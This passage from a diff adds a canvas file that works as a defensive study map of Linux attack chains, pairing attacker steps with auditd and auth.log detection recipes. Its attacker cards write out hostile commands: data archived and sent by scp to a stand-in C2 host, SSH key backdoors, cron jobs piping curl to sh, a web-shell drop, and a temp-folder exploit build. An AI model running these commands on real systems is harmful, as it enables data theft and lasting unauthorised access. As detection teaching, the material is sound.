+      "text": "### 🔵 Detect — read the surroundings, not the exploit\n1. **Spike of discovery:** `whoami; id; pwd; ls -la; crontab -l; ps aux | egrep \"edr|splunk|elastic\"; uname -r`\n2. **Download into temp:** `wget … -O /tmp/pwnkit.c` → `gcc /tmp/pwnkit.c -o /tmp/pwnkit` → `chmod +x` → run\n3. **Data out via SCP:** `tar czf dump.tar.gz /root /etc/` → `scp dump.tar.gz attacker@c2-server.thm:~` (now `whoami` = root)\n\n**Prove the escalation — compare the user before and after**\n```bash\nausearch -i -x pwnkit                # uid=serviceuser\nausearch -i --ppid <pwnkit-pid>      # bash with uid=root\nausearch -i --ppid <root-bash-pid>   # the attacker continues as root\n```",
+      "color": "5"
+    },
+    {
+      "id": "23a6f08a999b4e16",
+      "type": "text",
+      "x": 1090,
+      "y": 5970,
+      "width": 680,
+      "height": 316,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Studying PwnKit's mechanics** to detect it — you can catch it without knowing the exploit\n- ⛔ **One-exploit signatures** — the next exploit differs; the **pattern** (discovery → temp download / compile → uid flip) stays\n- ✅ The **uid flip** (`serviceuser` → `root`) is the proof of success\n- 🔶 A compiler (`gcc`) running under a web service account is a loud smell\n- ⚠️ 🔶 Make sure auditd covers `gcc`, `chmod` and executions from `/tmp`",
+      "color": "3"
+    },
+    {
+      "id": "5342c220484f4b0f",
+      "type": "text",
+      "x": 1850,
+      "y": 5089,
+      "width": 680,
+      "height": 408,
+      "text": "### 4️⃣ 🔶 Usually inherits the admin's rights\n🔴 **Attacker**\n- The payload runs with the privileges of whoever launched it; admins often install as `root` or via `sudo`, so escalation is frequently unnecessary",
+      "color": "1"
+    },
+    {
+      "id": "c9fa49c79bb84d59",
+      "type": "text",
+      "x": 1850,
+      "y": 5523,
+      "width": 680,
+      "height": 421,
+      "text": "### 🔵 Detect\n- Check the **`uid`** of the payload's children: `uid=root` from the start means it was run elevated\n```bash\ngrep -E 'COMMAND=' /var/log/auth.log\n```\n- Shows what the admin ran under `sudo` — e.g. the `curl` / `pip3` install itself",
+      "color": "5"
+    },
+    {
+      "id": "81b24fdc6d1f4f97",
+      "type": "text",
+      "x": 1850,
+      "y": 5970,
+      "width": 680,
+      "height": 316,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Hunting exploit artifacts here** — the privileges were handed over, not stolen",
+      "color": "3"
+    },
+    {
+      "id": "b697bceaf39f47db",
+      "type": "text",
+      "x": 2610,
+      "y": 5089,
+      "width": 680,
+      "height": 408,
+      "text": "### 4️⃣ 🔶 Privilege = the trusted component's privilege\n🔴 **Attacker**\n- The malicious code inherits the account of the library or service it hides in (XZ sits inside SSH, a privileged daemon)",
+      "color": "1"
+    },
+    {
+      "id": "29b49c77d20f414e",
+      "type": "text",
+      "x": 2610,
+      "y": 5523,
+      "width": 680,
+      "height": 421,
+      "text": "### 🔵 Detect\n- Check `uid` on the unexpected child: a service running as `root` hands over root immediately\n- Leaked secrets (SSH keys, tokens) later appear as **new `Accepted` logins** — check `auth.log` and `sudo` `COMMAND=` lines",
+      "color": "5"
+    },
+    {
+      "id": "fd6fbf830e8e44d1",
+      "type": "text",
+      "x": 2610,
+      "y": 5970,
+      "width": 680,
+      "height": 316,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Searching for an escalation exploit** — the privilege came with the compromised component",
+      "color": "3"
+    },
+    {
+      "id": "52e4a5e0e13341b6",
+      "type": "text",
+      "x": 330,
+      "y": 6396,
+      "width": 680,
+      "height": 532,
+      "text": "### 5️⃣ Lock the door behind them\n🔴 **Attacker**\n- **Dota3:** change the breached user's password (to keep rival botnets out), then wipe and replace the SSH keys:\n  `rm -rf .ssh; mkdir .ssh; echo \"ssh-rsa … mdrfckr\" >> .ssh/authorized_keys; chmod -R go= ~/.ssh`\n- **Backdoored key:** append to `~/.ssh/authorized_keys` — it blends in with the legit keys · T1098.004†\n- **New user:** `useradd`, then `usermod` into `sudo` · T1136.001†\n- **Cron:** `@reboot nohup …` (APT29's GoldMax) or `*/10 * * * * root (curl …pastebin… ) | sh` in `/etc/cron.d/root` (Rocke) · T1053.003†\n- **systemd service:** `ExecStart=` a disguised binary, e.g. `cloud-online` (Sandworm) or `syslogd` (Kimsuky) · T1543.002†\n- Standalone servers can run for years without a reboot, so some actors don't hurry",
+      "color": "1"
+    },
+    {
+      "id": "5eb34c3bdef54410",
+      "type": "text",
+      "x": 330,
+      "y": 6954,
+      "width": 680,
+      "height": 633,
+      "text": "### 🔵 Detect — watch the files, not just the commands\n**Accounts**\n```bash\ngrep -E '(passwd|useradd|usermod|userdel)\\[' /var/log/auth.log\n```\n`useradd … new user: name=support …` then `usermod … add 'support' to group 'sudo'` · `passwd … changed by 'root'`\n\n**SSH keys — a file-watch rule on `authorized_keys`**\n```bash\nausearch -i -f /.ssh/authorized_keys\n```\n`echo \"key\" >> authorized_keys` uses a **shell builtin**, so auditd shows it only as `proctitle=bash`. Known string: **`mdrfckr`**\n\n**Cron and systemd — watch these paths**\n- `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`\n- `/lib/systemd/system/*`, `/etc/systemd/system/*` (and rarer unit locations)\n- Related processes: `crontab -e`, `nano /etc/crontab`, `systemctl start|enable <service>`\n```bash\nausearch -i -f /etc/systemd\nausearch -i -x crontab\n```",
+      "color": "5"
+    },
+    {
+      "id": "c9408054dfa04b40",
+      "type": "text",
+      "x": 330,
+      "y": 7613,
+      "width": 680,
+      "height": 402,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Eyeballing `authorized_keys` for the bad key** — a backdoor key sits between legitimate ones and is impossible to guess by eye\n- ⛔ **Process-creation rules for key backdoors** — builtins like `echo` aren't traced; use a **file-watch** rule\n- ⛔ **Waiting for a reboot** — servers rarely restart, so persistence can sit unused for months\n- ✅ Hunt the **moment of change** (file write, `useradd`), then name who did it through `auid`\n- ⚠️ If malware **reappears** after you removed every persistence method above → suspect a compromised public-facing app",
+      "color": "3"
+    },
+    {
+      "id": "f36c89f81bcb409c",
+      "type": "text",
+      "x": 1090,
+      "y": 6396,
+      "width": 680,
+      "height": 532,
+      "text": "### 5️⃣ App-level persistence beats the OS layer\n🔴 **Attacker**\n- **Web shell or backdoor in the app:** e.g. a WSO shell uploaded after a breached WordPress admin — commands run through the website, **no cron job or SSH key needed** · T1505.003†\n- Backdoor file dropped with `curl --output /var/www/html/backdoor.php \"<url>\"`\n- Plus the OS menu once root: cron (`@reboot`, `*/10 … curl … | sh`), systemd (`cloud-online`, `syslogd`), SSH key, new user — as in Chain A",
+      "color": "1"
+    },
+    {
+      "id": "f01eedfee6d545e0",
+      "type": "text",
+      "x": 1090,
+      "y": 6954,
+      "width": 680,
+      "height": 633,
+      "text": "### 🔵 Detect — OS layer and app layer\n**OS layer** — same watches as Chain A\n```bash\nausearch -i -f /etc/systemd\nausearch -i -x crontab\nausearch -i -f /.ssh/authorized_keys\n```\n- Cron: look for `@reboot` lines and `*/10 * * * * … curl … | sh`\n- systemd: check the `ExecStart=` path, not the service name\n\n**App layer**\n- 🔶 New or modified files in the web root (`/var/www/html/*.php`) and web-log requests to an odd file that suddenly executes commands\n- Process tree: the **web app spawning shells** again later = the backdoor is alive\n- **Malware reappearing after thorough cleaning** = the application is still compromised",
+      "color": "5"
+    },
+    {
+      "id": "1b6e41b6967e496b",
+      "type": "text",
+      "x": 1090,
+      "y": 7613,
+      "width": 680,
+      "height": 402,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **auditd and system logs for web-shell persistence** — they often never see it; it lives in the application layer\n- ⛔ **Cleaning the host again and again** — fix or patch the vulnerable app and review its admin accounts\n- ⛔ **Trusting service names** — \"cloud-online\" and \"syslogd\" were chosen to look trusted; read `ExecStart=`\n- ⚠️ Web-shell detection itself is outside your source notes — treat the web root as a monitored directory 🔶",
+      "color": "3"
+    },
+    {
+      "id": "a8b7475b9b504e87",
+      "type": "text",
+      "x": 1850,
+      "y": 6396,
+      "width": 680,
+      "height": 532,
+      "text": "### 5️⃣ 🔶 Whatever the payload sets up\n🔴 **Attacker**\n- The same OS menu as Chain A: cron, systemd, SSH key, new user\n- Stealers and miners may also skip persistence entirely",
+      "color": "1"
+    },
+    {
+      "id": "b4571354320e41dc",
+      "type": "text",
+      "x": 1850,
+      "y": 6954,
+      "width": 680,
+      "height": 633,
+      "text": "### 🔵 Detect\n- The same file-watch paths and `auth.log` greps as Chain A\n- **Attribution:** compare the `auid` of whatever wrote the file with the admin who ran the install — a match proves the chain starts in the admin's session\n```bash\nausearch -i -f /etc/systemd\nausearch -i -f /.ssh/authorized_keys\n```",
+      "color": "5"
+    },
+    {
+      "id": "fcdf505129774c12",
+      "type": "text",
+      "x": 1850,
+      "y": 7613,
+      "width": 680,
+      "height": 402,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Bash history** for the persistence step — scripts and builtins escape it\n- ⚠️ The same builtin trap applies: `echo … >> authorized_keys` shows as `bash`",
+      "color": "3"
+    },
+    {
+      "id": "12f21203954043e2",
+      "type": "text",
+      "x": 2610,
+      "y": 6396,
+      "width": 680,
+      "height": 532,
+      "text": "### 5️⃣ 🔶 Stay inside the dependency\n🔴 **Attacker**\n- The backdoor persists by *being* part of the software — it returns on every update or rebuild\n- Stolen secrets (SSH keys, tokens) allow account-style persistence later",
+      "color": "1"
+    },
+    {
+      "id": "aae75acff60a4922",
+      "type": "text",
+      "x": 2610,
+      "y": 6954,
+      "width": 680,
+      "height": 633,
+      "text": "### 🔵 Detect\n- Watch the usual persistence files (cron, systemd, `authorized_keys`) for changes made by the compromised component\n- `auth.log`: `Accepted` logins using a leaked key from **unfamiliar IPs**\n- Rotate and revoke leaked keys and tokens; then re-check `authorized_keys` for additions",
+      "color": "5"
+    },
+    {
+      "id": "a47cdd0c14134483",
+      "type": "text",
+      "x": 2610,
+      "y": 7613,
+      "width": 680,
+      "height": 402,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Cleaning only the host** — if the dependency stays infected it comes back\n- ⚠️ Persistence that lives in a package manager's output won't show in cron/systemd watches",
+      "color": "3"
+    },
+    {
+      "id": "d2cd8ab7b9ca49ca",
+      "type": "text",
+      "x": 330,
+      "y": 8125,
+      "width": 680,
+      "height": 315,
+      "text": "### 6️⃣ \"Hack and forget\" payoffs\n🔴 **Attacker**\n- **Cryptominer** (XMRig `initall`) · T1496†\n- **Botnet:** Mirai-style DDoS · the scanner `tsm` hunts the next SSH victims\n- **Proxy:** send phishing, host malware, route attacker traffic · T1090†\n- Often all three at once; at scale a few victims per month\n- Or the host becomes a **foothold into the corporate network**",
+      "color": "1"
+    },
+    {
+      "id": "05b52d9b69234067",
+      "type": "text",
+      "x": 330,
+      "y": 8466,
+      "width": 680,
+      "height": 385,
+      "text": "### 🔵 Detect — the final stage is the loudest\n- **EDR / AV:** the XMRig binary is blocked by most EDRs\n- **auditd:** hidden folders in `/tmp`, files named like known malware, `nohup`\n- **Network:** SSH port scans across 192.168.* and 172.16.*\n- **SIEM:** SSH login from a known-malicious IP + discovery spike + the string `mdrfckr`\n- **Manual two-source check:**\n```bash\ngrep Accepted /var/log/auth.log          # external password logins\nausearch -i -x <discovery-command>       # then trace the origin\n```",
+      "color": "5"
+    },
+    {
+      "id": "bae7c6752d8d4648",
+      "type": "text",
+      "x": 330,
+      "y": 8877,
+      "width": 680,
+      "height": 281,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Reverse-engineering the miner** — the **entry** (SSH login) and **persistence** (key / user) are what you must close\n- ⛔ **Killing the miner alone** — the attacker's key and password change stay behind\n- 🔶 After clean-up, move SSH to key-based authentication; weak passwords are why Dota3 is still active",
+      "color": "3"
+    },
+    {
+      "id": "03c544fec06048e6",
+      "type": "text",
+      "x": 1090,
+      "y": 8125,
+      "width": 680,
+      "height": 315,
+      "text": "### 6️⃣ Entry point, espionage or hypervisor ransomware\n🔴 **Attacker**\n- **Linux as entry point:** a compromised firewall, web or mail server opens the corporate network, even when 99% of the estate is Windows\n- **Espionage:** Kimsuky's backdoor kept alive by a systemd service named `syslogd`\n- **Ransomware:** hypervisors (ESXi) are prime targets — one breached Linux host can encrypt every hosted VM · T1486†",
+      "color": "1"
+    },
+    {
+      "id": "35a6382a38174649",
+      "type": "text",
+      "x": 1090,
+      "y": 8466,
+      "width": 680,
+      "height": 385,
+      "text": "### 🔵 Detect\n⚠️ Impact-stage detections aren't in your source notes. Your best chance is **earlier**:\n- Web logs and the process tree on the exposed app\n- Reverse shell alerts, the `uid` flip, `/tmp` downloads\n- 🔶 Movement *out* of this host = new **SSH logins** from it to other systems (check `Accepted` lines there)",
+      "color": "5"
+    },
+    {
+      "id": "cd2ef2aab292464a",
+      "type": "text",
+      "x": 1090,
+      "y": 8877,
+      "width": 680,
+      "height": 281,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Waiting for ransomware to show** — by then the entry and persistence steps were missed; invest in the earlier rows\n- ⚠️ Many SOC teams skip Linux monitoring altogether — a dangerous blind spot when one Linux server fronts a Windows network",
+      "color": "3"
+    },
+    {
+      "id": "6910de50baaa4672",
+      "type": "text",
+      "x": 1850,
+      "y": 8125,
+      "width": 680,
+      "height": 315,
+      "text": "### 6️⃣ 🔶 Whatever the payload was built for\n🔴 **Attacker**\n- Miner, botnet, data stealer or a foothold — the admin just delivered it",
+      "color": "1"
+    },
+    {
+      "id": "d6a8d9cc32cb483c",
+      "type": "text",
+      "x": 1850,
+      "y": 8466,
+      "width": 680,
+      "height": 385,
+      "text": "### 🔵 Detect\n- No stage-specific source guidance — use the same final-stage indicators as Chain A: EDR/AV hits, hidden `/tmp` folders, `nohup`, outbound scans",
+      "color": "5"
+    },
+    {
+      "id": "d02e47e930254473",
+      "type": "text",
+      "x": 1850,
+      "y": 8877,
+      "width": 680,
+      "height": 281,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Blaming the admin first** — contain, then trace the chain with `auid`",
+      "color": "3"
+    },
+    {
+      "id": "8519d91f70cd4ff5",
+      "type": "text",
+      "x": 2610,
+      "y": 8125,
+      "width": 680,
+      "height": 315,
+      "text": "### 6️⃣ 🔶 Mass impact\n🔴 **Attacker**\n- Many hosts receive the same malicious update at once; leaked secrets (SSH keys, tokens) extend the damage to other systems",
+      "color": "1"
+    },
+    {
+      "id": "688edff7662d4cef",
+      "type": "text",
+      "x": 2610,
+      "y": 8466,
+      "width": 680,
+      "height": 385,
+      "text": "### 🔵 Detect\n- No stage-specific source guidance — scope the blast radius: which hosts ran the affected package or action version, and which secrets were exposed",
+      "color": "5"
+    },
+    {
+      "id": "b9114bc151ac4d5e",
+      "type": "text",
+      "x": 2610,
+      "y": 8877,
+      "width": 680,
+      "height": 281,
+      "text": "### 🟡 Don't waste time on\n- ⛔ **Cleaning one host at a time** — scope the affected software and secrets first",
+      "color": "3"
+    },
+    {
+      "id": "35f8d9ae707b4033",
+      "type": "group",
+      "x": -40,
+      "y": 9288,
+      "width": 3370,
+      "height": 1906,
+      "label": "📚 Cross-chain cheat sheets"
+    },
+    {
+      "id": "a119b8863e4a47e5",
+      "type": "text",
+      "x": 0,
+      "y": 9328,
+      "width": 1605,
+      "height": 687,
+      "text": "## 🗂️ Which logs deserve your time\n| Source | Where | Verdict |\n|---|---|---|\n| Authentication | `/var/log/auth.log` (`/var/log/secure` on RHEL) | ✅ **Top 3** — logins, SSH `Accepted` / `Failed`, sudo `COMMAND=`, `useradd` / `usermod` |\n| App-specific | e.g. `/var/log/nginx/access.log`, database, mail, VPN logs | ✅ **Top 3** — web attacks, odd queries, abnormal VPN logins |\n| Runtime | auditd `/var/log/audit/audit.log` (or Sysmon for Linux, Falco, osquery, EDR) | ✅ **Top 3** — process creation, file changes, network |\n| Bash history | `~/.bash_history` | ⛔ Unreliable: written at logout; misses leading-space commands, scripts, other shells, and cron / web / OS commands |\n| syslog / messages | `/var/log/syslog` | ⛔ Noisy; mostly a DFIR source |\n| Kernel | `/var/log/kern.log` | ⛔ Advanced investigations only |\n| Package managers | `dpkg.log` / `apt` · `dnf.log` / `yum.log` | ⛔ Rarely seen in a daily SOC routine; useful in DFIR |\n\n**Remember:** Linux logs are plain text with **no event IDs** and loose formatting, and format, verbosity and location are easy to change — logs on your system may differ or not exist. Narrow down with `grep`, e.g. `grep -v CRON`, or discover sources with `grep -R -E \"auth|login|session\" /var/log`.",
+      "color": "5"
+    },
+    {
+      "id": "a66f55fdb1184a6d",
+      "type": "text",
+      "x": 1685,
+      "y": 9328,
+      "width": 1605,
+      "height": 687,
+      "text": "## 🔧 auditd — read it and walk the process tree\n**Rules** live in `/etc/audit/rules.d/` (what syscalls and files to watch, with an optional `key=`). Logs: `/var/log/audit/audit.log` — easier through `ausearch -i`.\n\n**Fields**\n- `pid` / `ppid` — link events and build the process tree\n- `auid` — the account originally logged in (keyboard or SSH); **`unset` = no login session** (service, cron)\n- `uid` — who ran it; differs from `auid` after `sudo` / `su`\n- `tty` — session identifier; `(none)` = not interactive\n- `exe` — absolute path of the binary, the basis of detection rules\n- `key` — the rule's tag, great for filtering\n\n**Search recipes**\n```bash\nausearch -i -k <key>                       # by rule key (proc_wget, file_sshconf)\nausearch -i -x <cmd>                       # by command / executable\nausearch -i -f <path>                      # by file touched\nausearch -i --pid <pid>                    # one process; walk UP to PID 1\nausearch -i --ppid <pid> | grep proctitle  # all CHILDREN of a process\n```\n**Event shape:** PROCTITLE (command line) · CWD · PATH (files) · SYSCALL (details)\n\n**Alternatives** — same syscall principle: Sysmon for Linux, Falco (containers), osquery, EDRs.\n**Keep rules balanced** — logging everything produces gigabytes and buries the attack (see Neo23x0/auditd rules).",
+      "color": "5"
+    },
+    {
+      "id": "b69d2519200e43ac",
+      "type": "text",
+      "x": 0,
+      "y": 10070,
+      "width": 1605,
+      "height": 600,
+      "text": "## 🔎 How to tell which chain you're in — look at the PARENT\n1. Suspicious command (e.g. `whoami`) whose ancestors are **`sshd` → bash**, with a real `auid` and `tty=pts/N` → **A · SSH** (confirm an `Accepted` line in `auth.log`)\n2. Ancestors are a **web / app process** (`python3 app.py`, PHP), `auid=unset`, `tty=(none)` → **B · exposed service** (confirm in web logs)\n3. Ancestors are an **admin session** that just ran `curl … | bash` or `pip3 install` → **C · human-led** 🔶\n4. Ancestors are an **internal service / updater** that suddenly runs `wget` → **D · supply chain**\n\n**From the source's own examples**\n- A PHP process running `whoami` = web attack\n- An internal service running `wget` = supply chain compromise\n- An XMRig miner installed from a user's SSH session = SSH breach\n\n**Method:** start with a trigger (SIEM alert, suspicious command, connection to a known-bad IP) → walk **up** with `--pid` until PID 1 → list **down** with `--ppid` → the first process in the chain names the entry door.",
+      "color": "5"
+    },
+    {
+      "id": "e98bdc4f835a4dc1",
+      "type": "text",
+      "x": 1685,
+      "y": 10070,
+      "width": 1605,
+      "height": 600,
+      "text": "## ⚖️ Side-by-side — how the chains differ\n| | 🔑 A · SSH | 🌐 B · Service / web | 🧑‍💻 C · Human-led | 📦 D · Supply chain |\n|---|---|---|---|---|\n| **Who drives** | Botnet, then a human | Exploit, then a human | The admin themself | Trusted software |\n| **Parent of first commands** | `sshd` → `bash` | web app → `sh -c` | admin shell → payload | internal service |\n| **`auid`** | a real user | `unset` | a real user | `unset` 🔶 |\n| **Discovery** | scripted burst (CPU/RAM for miners) | blind shell, then `whoami` | from the payload 🔶 | from the service 🔶 |\n| **Tools** | SCP / `wget` / `curl` | reverse shell, then `wget` / `curl` | payload fetches | payload fetches |\n| **Priv-esc** | rare | common (PwnKit, SUID) | rare 🔶 | follows the component 🔶 |\n| **Persistence** | `authorized_keys`, new user, cron, systemd | web shell + OS menu | OS menu 🔶 | in the dependency, leaked secrets 🔶 |\n| **Best pivot** | `Accepted` line + `auid` | tree up to the app; web logs | the install command in the admin session | the service's unexpected child |\n| **Main logs** | `auth.log` + auditd | web logs + auditd | auditd | auditd |",
+      "color": "5"
+    },
+    {
+      "id": "c14fd194c0134b05",
+      "type": "text",
+      "x": 0,
+      "y": 10725,
+      "width": 1605,
+      "height": 429,
+      "text": "## 💡 Cheap, high-value detection rules\n- **Any `whoami` execution** — legit apps rarely run it, attackers almost always do first\n- **A service account spawning a shell** or discovery command (`auid=unset` + `uid=<service>`)\n- **`nohup`** launched from a login session or `/tmp`\n- **New files or hidden folders in `/tmp` and `/var/tmp`**, or names like `exploit`, `shell.php`, `kF1pBsY5`, `dota3.tar.gz`\n- **Writes to** `authorized_keys`, cron paths, systemd paths; `useradd` / `usermod … sudo`\n- **`sudo` commands** that stop security tools (`systemctl stop edr`)\n- **SSH `Accepted` by password** from an external IP at an odd hour\n- **Reverse-shell command lines** (`/dev/tcp`, `socat … EXEC:bash`, python `pty.spawn`) — critical\n- **EDR / AV hits** (XMRig is blocked by most EDRs)",
+      "color": "3"
+    },
+    {
+      "id": "719b87d72ec046e7",
+      "type": "text",
+      "x": 1685,
+      "y": 10725,
+      "width": 1605,
+      "height": 429,
+      "text": "## ✅ Golden rules (from the key takeaways)\n- Linux logging can be chaotic, but it often stores enough details to detect the threat\n- Logs live in `/var/log/` and are plain text by default\n- Top three sources for the SOC: **auth.log**, **app-specific logs**, **runtime logs**\n- Bash history is unreliable — use auditd or an alternative\n- SSH attacks are widespread but **easy to detect through authentication logs**\n- Exposed services are always a risk — one compromised app can mean the whole host\n- Phishing is rare on Linux, but human-led and supply-chain attacks happen\n- **Process tree analysis** is the best way to identify Initial Access\n- \"Hack and forget\" attacks are automated, at scale, and use prebuilt commands (`ls`, `cat`, `wget`, `ssh`)\n- Many SOC teams skip Linux monitoring — a dangerous blind spot",
+      "color": "4"
+    }
+  ],
+  "edges": [
+    {
+      "id": "ab8755627a1f4e62",
+      "fromNode": "e1ff9c10a6694685",
+      "fromSide": "bottom",
+      "toNode": "14d1d2d6d8d44fe0",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "same SSH session (auid)"
+    },
+    {
+      "id": "1543a8720bc04846",
+      "fromNode": "5cf17d60d99f450a",
+      "fromSide": "bottom",
+      "toNode": "d43d4688c004401e",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "blind shell, then orient"
+    },
+    {
+      "id": "a37df2e7c7314158",
+      "fromNode": "24b3b0fa1b3345e2",
+      "fromSide": "bottom",
+      "toNode": "1c820abf54b14268",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "payload runs as the admin"
+    },
+    {
+      "id": "f37ee69cbac84c73",
+      "fromNode": "f882bb0ddc014a50",
+      "fromSide": "bottom",
+      "toNode": "5381233bbd9b451f",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "trusted code turns hostile"
+    },
+    {
+      "id": "471aec6a04234684",
+      "fromNode": "95a30289037740ad",
+      "fromSide": "bottom",
+      "toNode": "2c2cf881916d47ea",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "upload tools over SSH"
+    },
+    {
+      "id": "1f3ced311983458e",
+      "fromNode": "b6eb98a945ab4e9a",
+      "fromSide": "bottom",
+      "toNode": "320f4fa8eb934f02",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "need a real shell"
+    },
+    {
+      "id": "b061776de1ac4eb6",
+      "fromNode": "39fccecbbdb0445f",
+      "fromSide": "bottom",
+      "toNode": "84f96bd0e87e4329",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "fetch next stage"
+    },
+    {
+      "id": "f496ee59ea2c4c95",
+      "fromNode": "d98e62246c4e4b52",
+      "fromSide": "bottom",
+      "toNode": "39604558c1094d56",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "phones home"
+    },
+    {
+      "id": "7291a315f7d44230",
+      "fromNode": "c8016f42887941f5",
+      "fromSide": "bottom",
+      "toNode": "41c6bd785eaa4df7",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "if a limited user"
+    },
+    {
+      "id": "010ccd1c8e2549f1",
+      "fromNode": "35eeff87ba0f4eb0",
+      "fromSide": "bottom",
+      "toNode": "8e5e80ab6a0c4863",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "low-priv → root"
+    },
+    {
+      "id": "3ff1268e77bb468b",
+      "fromNode": "6bf5700b87444205",
+      "fromSide": "bottom",
+      "toNode": "5342c220484f4b0f",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "already privileged 🔶"
+    },
+    {
+      "id": "7fb6aab31a174442",
+      "fromNode": "ba4d80ce3d2c459f",
+      "fromSide": "bottom",
+      "toNode": "b697bceaf39f47db",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "depends on the service 🔶"
+    },
+    {
+      "id": "d79919f55e0c4d81",
+      "fromNode": "adf0318a396b4175",
+      "fromSide": "bottom",
+      "toNode": "52e4a5e0e13341b6",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "lock the door"
+    },
+    {
+      "id": "ff6400531ff74a52",
+      "fromNode": "23a6f08a999b4e16",
+      "fromSide": "bottom",
+      "toNode": "f36c89f81bcb409c",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "keep access"
+    },
+    {
+      "id": "5938901c49184c9f",
+      "fromNode": "81b24fdc6d1f4f97",
+      "fromSide": "bottom",
+      "toNode": "a8b7475b9b504e87",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "survive reboot"
+    },
+    {
+      "id": "7ade0fc8954643ba",
+      "fromNode": "fd6fbf830e8e44d1",
+      "fromSide": "bottom",
+      "toNode": "12f21203954043e2",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "stay in the dependency 🔶"
+    },
+    {
+      "id": "ff56a52f0a7b4b4a",
+      "fromNode": "c9408054dfa04b40",
+      "fromSide": "bottom",
+      "toNode": "d2cd8ab7b9ca49ca",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "payoff"
+    },
+    {
+      "id": "d3b6f9cfbb944d04",
+      "fromNode": "1b6e41b6967e496b",
+      "fromSide": "bottom",
+      "toNode": "03c544fec06048e6",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "pivot / impact"
+    },
+    {
+      "id": "4e22b646a3234f20",
+      "fromNode": "fcdf505129774c12",
+      "fromSide": "bottom",
+      "toNode": "6910de50baaa4672",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "payload's purpose"
+    },
+    {
+      "id": "537d843e324b44e3",
+      "fromNode": "a47cdd0c14134483",
+      "fromSide": "bottom",
+      "toNode": "8519d91f70cd4ff5",
+      "toSide": "top",
+      "toEnd": "arrow",
+      "label": "mass impact"
+    }
+  ]
+}
